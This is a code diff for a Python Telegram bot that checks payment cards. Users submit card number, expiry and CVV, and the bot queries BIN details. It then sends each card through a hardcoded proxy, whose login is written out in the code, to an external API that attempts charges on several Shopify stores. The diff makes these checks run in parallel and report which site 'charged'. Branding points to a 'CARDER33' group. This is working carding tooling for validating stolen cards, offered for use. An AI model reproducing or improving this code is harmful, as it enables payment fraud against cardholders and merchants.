@@ -2628,8 +2628,8 @@ from telegram import Update
 from telegram.constants import ParseMode
 from telegram.ext import ContextTypes
 
-from db import get_user, update_user   # your db functions
-from bin import get_bin_info           # your BIN function
+from db import get_user, update_user
+from bin import get_bin_info
 
 logger = logging.getLogger(__name__)
 
@@ -2655,7 +2655,6 @@ async def consume_credit(user_id: int) -> bool:
         return True
     return False
 
-
 # ===== API template =====
 API_CHECK_TEMPLATE = (
     "https://auto-shopify-6cz4.onrender.com/index.php"
@@ -2663,7 +2662,6 @@ API_CHECK_TEMPLATE = (
     "&cc={card}"
     "&proxy=107.172.163.27:6543:nslqdeey:jhmrvnto65s1"
 )
-
 
 # ===== Main Command =====
 async def sp(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -2677,7 +2675,7 @@ async def sp(update: Update, context: ContextTypes.DEFAULT_TYPE):
     # Argument check
     if not context.args:
         await update.message.reply_text(
-            "❌ Please provide card details. Example: /sp card|mm|yy|cvv",
+            "❌ Please provide card details. Example: <code>/sp card|mm|yy|cvv</code>",
             parse_mode=ParseMode.HTML
         )
         return
@@ -2709,15 +2707,11 @@ async def sp(update: Update, context: ContextTypes.DEFAULT_TYPE):
         )
         return
 
+    # Initial processing message
     BULLET_GROUP_LINK = "https://t.me/CARDER33"
     bullet_link = f'<a href="{BULLET_GROUP_LINK}">[⌇]</a>'
-
-    # Initial processing message
     processing_text = (
-        f"<pre><code>𝗣𝗿𝗼𝗰𝗲𝘀𝘀𝗶𝗻𝗴⏳</code></pre>\n"
-        f"<pre><code>{escape(card_input)}</code></pre>\n"
-        f"{bullet_link} 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ➵ 𝑨𝒖𝒕𝒐𝒔𝒉𝒐𝒑𝒊𝒇𝒚\n"
-        f"{bullet_link} 𝗦𝘁𝗮𝘁𝘂𝘀 ➵ Checking 🔎..."
+        f"<pre><code>𝗣𝗿𝗼𝗰𝗲𝘀𝘀𝗶𝗻𝗴⏳\n{escape(card_input)}</code></pre>"
     )
 
     msg = await update.message.reply_text(
@@ -2726,7 +2720,7 @@ async def sp(update: Update, context: ContextTypes.DEFAULT_TYPE):
         disable_web_page_preview=True
     )
 
-    # Run the work
+    # Run in background
     asyncio.create_task(process_card_check(user, card_input, custom_urls, msg))
 
 
@@ -2739,7 +2733,6 @@ async def process_card_check(user, card_input, custom_urls, msg):
         try:
             bin_number = cc[:6]
             bin_details = await get_bin_info(bin_number)
-
             brand = (bin_details.get("scheme") or "N/A").title()
             issuer = bin_details.get("bank") or "N/A"
             country_name = bin_details.get("country") or "Unknown"
@@ -2752,23 +2745,23 @@ async def process_card_check(user, card_input, custom_urls, msg):
             country_name = "Unknown"
             country_flag = "🏳️"
 
-        # --- Loop over all sites ---
-        final_data = None
-        for site in custom_urls:
+        # --- Check all sites in parallel ---
+        best_result = None
+
+        async def check_site(site):
+            nonlocal best_result
             api_url = API_CHECK_TEMPLATE.format(card=card_input, site=site)
             async with aiohttp.ClientSession() as session:
                 try:
                     async with session.get(api_url, timeout=30) as resp:
                         api_text = await resp.text()
-                except Exception as e:
-                    logger.warning(f"API failed for site {site}: {e}")
-                    continue
+                except Exception:
+                    return
 
-            # Detect HTML error
+            # Skip HTML responses
             if '<!DOCTYPE html>' in api_text or '<html' in api_text:
-                continue
+                return
 
-            # Try parse JSON
             clean_text = re.sub(r'<[^>]+>', '', api_text).strip()
             json_start = clean_text.find('{')
             if json_start != -1:
@@ -2777,40 +2770,44 @@ async def process_card_check(user, card_input, custom_urls, msg):
             try:
                 data = json.loads(clean_text)
             except json.JSONDecodeError:
-                continue
+                return
 
-            # If Thank You found, short-circuit
-            if re.search(r"\b(thank you|approved|charged|success)\b", data.get("Response", ""), re.I):
-                final_data = data
-                break
+            resp_text = data.get("Response", "").upper()
 
-            # Otherwise keep the first valid response
-            if not final_data:
-                final_data = data
+            # Prioritize result: Charged > 3D > Declined
+            if best_result is None:
+                best_result = {**data, "site": site}
+            else:
+                prev_resp = best_result.get("Response", "").upper()
+                if re.search(r"(THANK YOU|APPROVED|CHARGED|SUCCESS)", resp_text) or \
+                   ("3D_AUTHENTICATION" in resp_text and prev_resp not in ["CHARGED", "APPROVED"]):
+                    best_result = {**data, "site": site}
 
-        if not final_data:
+        await asyncio.gather(*(check_site(site) for site in custom_urls))
+
+        if not best_result:
             await msg.edit_text("❌ No valid responses from any site.", parse_mode=ParseMode.HTML)
             return
 
         # Extract fields
-        response_text = final_data.get("Response", "Unknown")
-        price = f"{final_data.get('Price', '0')}$"
-        gateway = final_data.get("Gateway", "Shopify")
+        response_text = best_result.get("Response", "Unknown")
+        price = f"{best_result.get('Price', '0')}$"
+        gateway = best_result.get("Gateway", "Shopify")
+        site_used = best_result.get("site", "N/A")
 
         full_name = " ".join(filter(None, [user.first_name, user.last_name]))
         requester = f'<a href="tg://user?id={user.id}">{escape(full_name)}</a>'
 
-        # 🔥 Enhance Response with icons
+        # Enhance Response
         display_response = escape(response_text)
-
         if re.search(r"\b(thank you|approved|charged|success)\b", response_text, re.I):
-            display_response = f"{escape(response_text)} ▸𝐂𝐡𝐚𝐫𝐠𝐞𝐝 🔥"
+            display_response += " ▸𝐂𝐡𝐚𝐫𝐠𝐞𝐝 🔥"
         elif "3D_AUTHENTICATION" in response_text.upper():
-            display_response = f"{escape(response_text)} 🔒"
+            display_response += " 🔒"
         elif "CARD_DECLINED" in response_text.upper():
-            display_response = f"{escape(response_text)} ❌"
+            display_response += " ❌"
         elif "INSUFFICIENT_FUNDS" in response_text.upper():
-            display_response = f"{escape(response_text)} 💳"
+            display_response += " 💳"
 
         # Branding
         DEVELOPER_NAME = "kคli liຖนxx"
@@ -2826,6 +2823,7 @@ async def process_card_check(user, card_input, custom_urls, msg):
 {bullet_link} 𝐆𝐚𝐭𝐞𝐰𝐚𝐲   ➵ <i>{escape(gateway)}</i>
 {bullet_link} 𝐀𝐦𝐨𝐮𝐧𝐭     ➵ {price} 💸
 {bullet_link} 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞   ➵ <i>{display_response}</i>
+{bullet_link} 𝐒𝐢𝐭𝐞      ➵ <code>{escape(site_used)}</code>
 ――――――――――――――――
 {bullet_link} 𝐁𝐫𝐚𝐧𝐝      ➵ <code>{brand}</code>
 {bullet_link} 𝐁𝐚𝐧𝐤       ➵ <code>{issuer}</code>
@@ -2846,6 +2844,7 @@ async def process_card_check(user, card_input, custom_urls, msg):
         logger.exception("Error in process_card_check")
         await msg.edit_text(f"❌ Error: <code>{escape(str(e))}</code>",
                             parse_mode=ParseMode.HTML)
+
 
 
 
